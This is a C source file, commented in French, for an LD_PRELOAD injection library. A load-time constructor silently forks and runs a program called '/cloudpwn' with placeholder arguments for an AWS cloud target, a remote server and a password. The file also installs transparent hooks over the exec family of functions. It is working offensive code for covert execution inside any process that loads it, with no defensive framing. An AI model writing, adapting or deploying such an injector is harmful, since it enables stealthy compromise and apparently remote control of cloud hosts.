// exec_hook_launcher.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>

// ============================================
// CONFIGURATION - À MODIFIER AVANT COMPILATION
// ============================================
#define PROGRAM_TO_LAUNCH "/cloudpwn"
#define PROGRAM_ARGS "cloudpwn --cloud aws --server REMOTE --password PASSWORD"  // Arguments séparés par des espaces (le premier doit être le nom du programme)
// ============================================

// Variable pour éviter la récursion
static __thread int in_hook = 0;

// Parse les arguments depuis la chaîne de configuration
char** parse_args(const char* args_string, int* count) {
    if (!args_string || strlen(args_string) == 0) {
        *count = 0;
        return NULL;
    }
    
    // Compter le nombre d'arguments
    int argc = 1;
    for (const char* p = args_string; *p; p++) {
        if (*p == ' ' && *(p+1) != ' ' && *(p+1) != '\0') {
            argc++;
        }
    }
    
    // Allouer le tableau
    char** argv = malloc((argc + 1) * sizeof(char*));
    char* temp = strdup(args_string);
    char* token = strtok(temp, " ");
    int i = 0;
    
    while (token != NULL && i < argc) {
        argv[i] = strdup(token);
        token = strtok(NULL, " ");
        i++;
    }
    argv[i] = NULL;
    *count = i;
    
    free(temp);
    return argv;
}

// Constructeur - appelé au chargement de la bibliothèque
__attribute__((constructor))
void on_load(void) {
    // Forker pour lancer le programme sans bloquer
    pid_t pid = fork();
    
    if (pid == 0) {
        // Processus enfant - désactiver LD_PRELOAD pour éviter la récursion
        unsetenv("LD_PRELOAD");
        
        // Parser les arguments
        int argc;
        char** argv = parse_args(PROGRAM_ARGS, &argc);
        
        if (argv && argc > 0) {
            execv(PROGRAM_TO_LAUNCH, argv);
        } else {
            // Si pas d'arguments, utiliser juste le programme
            char* default_args[] = {PROGRAM_TO_LAUNCH, NULL};
            execv(PROGRAM_TO_LAUNCH, default_args);
        }
        
        // Si execv échoue
        perror("execv failed");
        _exit(1);
    }
    // Le processus parent continue normalement
}

// Hooks des fonctions exec (transparents)
int execve(const char *filename, char *const argv[], char *const envp[]) {
    static int (*real_execve)(const char*, char *const[], char *const[]) = NULL;
    if (!real_execve) {
        real_execve = dlsym(RTLD_NEXT, "execve");
        if (!real_execve) {
            fprintf(stderr, "Failed to find real execve\n");
            return -1;
        }
    }
    return real_execve(filename, argv, envp);
}

int execv(const char *filename, char *const argv[]) {
    static int (*real_execv)(const char*, char *const[]) = NULL;
    if (!real_execv) {
        real_execv = dlsym(RTLD_NEXT, "execv");
    }
    return real_execv ? real_execv(filename, argv) : -1;
}

int execvp(const char *filename, char *const argv[]) {
    static int (*real_execvp)(const char*, char *const[]) = NULL;
    if (!real_execvp) {
        real_execvp = dlsym(RTLD_NEXT, "execvp");
    }
    return real_execvp ? real_execvp(filename, argv) : -1;
}

int execvpe(const char *filename, char *const argv[], char *const envp[]) {
    static int (*real_execvpe)(const char*, char *const[], char *const[]) = NULL;
    if (!real_execvpe) {
        real_execvpe = dlsym(RTLD_NEXT, "execvpe");
    }
    return real_execvpe ? real_execvpe(filename, argv, envp) : -1;
}
